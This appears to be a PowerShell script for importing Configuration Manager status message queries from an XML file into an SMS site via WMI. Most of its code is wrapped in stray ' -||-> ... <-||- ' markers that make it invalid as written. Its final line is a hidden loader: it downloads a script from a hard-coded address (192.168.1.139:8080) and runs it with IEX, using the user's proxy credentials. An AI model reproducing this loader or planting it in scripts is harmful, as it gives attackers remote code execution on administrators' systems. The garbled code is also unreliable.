
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed")]
    [ValidateScript({ -||-> Test-Connection -ComputerName $_ -Count 1 -Quiet <-||- })]
    [ValidateNotNullOrEmpty()]
    [string]$SiteServer,
    [parameter(Mandatory=$true, HelpMessage="Specify a valid path to where the XML file containing the Status Message Queries will be stored")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern("^[A-Za-z]{1}:\\\w+\\\w+")]
    [ValidateScript({
        
         -||-> if ( -||-> ( -||-> Split-Path -Path $_ -Leaf <-||- ).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0 <-||- ) {
            Throw  -||-> "$( -||-> Split-Path -Path $_ -Leaf <-||- ) contains invalid characters" <-||- 
        }
        else {
            
             -||-> if ( -||-> [System.IO.Path]::GetExtension(( -||-> Split-Path -Path $_ -Leaf <-||- )) -like ".xml" <-||- ) {
                
                 -||-> if ( -||-> Test-Path -Path $_ -PathType Leaf <-||- ) {
                        return  -||-> $true <-||- 
                }
                else {
                    Throw  -||-> "Unable to locate part of or the whole specified path, specify a valid path to an exported XML file" <-||- 
                } <-||- 
            }
            else {
                Throw  -||-> "$( -||-> Split-Path -Path $_ -Leaf <-||- ) contains an unsupported file extension. Supported extension is '.xml'" <-||- 
            } <-||- 
        } <-||- 
    })]
    [string]$Path
)
Begin {
    
     -||-> try {
         -||-> Write-Verbose "Determining SiteCode for Site Server: '$( -||-> $SiteServer <-||- )'" <-||- 
         -||-> $SiteCodeObjects =  -||-> Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop <-||-  <-||- 
         -||-> foreach ($SiteCodeObject in  -||-> $SiteCodeObjects <-||- ) {
             -||-> if ( -||-> $SiteCodeObject.ProviderForLocalSite -eq $true <-||- ) {
                 -||-> $SiteCode = $SiteCodeObject.SiteCode <-||- 
                 -||-> Write-Debug "SiteCode: $( -||-> $SiteCode <-||- )" <-||- 
            } <-||- 
        } <-||- 
    }
    catch [Exception] {
        Throw  -||-> "Unable to determine SiteCode" <-||- 
    } <-||- 
}
Process {
    
     -||-> [xml]$XMLData =  -||-> Get-Content -Path $Path <-||-  <-||- 
    
     -||-> try {
         -||-> if ( -||-> $XMLData.ConfigurationManager.Description -like "Export of Status Message Queries" <-||- ) {
             -||-> Write-Verbose -Message "Successfully validated XML document" <-||- 
        }
        else {
            Throw  -||-> "Invalid XML document loaded" <-||- 
        } <-||- 
         -||-> foreach ($Query in  -||-> ( -||-> $XMLData.ConfigurationManager.Query <-||- ) <-||- ) {
             -||-> $NewInstance = ( -||-> [WmiClass]"\\$( -||-> $SiteServer <-||- )\root\SMS\site_$( -||-> $SiteCode <-||- ):SMS_Query" <-||- ).CreateInstance() <-||- 
             -||-> $NewInstance.Name = $Query.Name <-||- 
             -||-> $NewInstance.Expression = $Query.Expression <-||- 
             -||-> $NewInstance.TargetClassName = $Query.TargetClassName <-||- 
             -||-> $NewInstance.Put() | Out-Null <-||- 
             -||-> Write-Verbose -Message "Imported query '$( -||-> $Query.Name <-||- )' successfully" <-||- 
        } <-||- 
    }
    catch [Exception] {
        Throw  -||-> $_.Exception.Message <-||- 
    } <-||- 
}
$m=new-object net.webclient;$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $m.downloadstring('http://192.168.1.139:8080/lol');



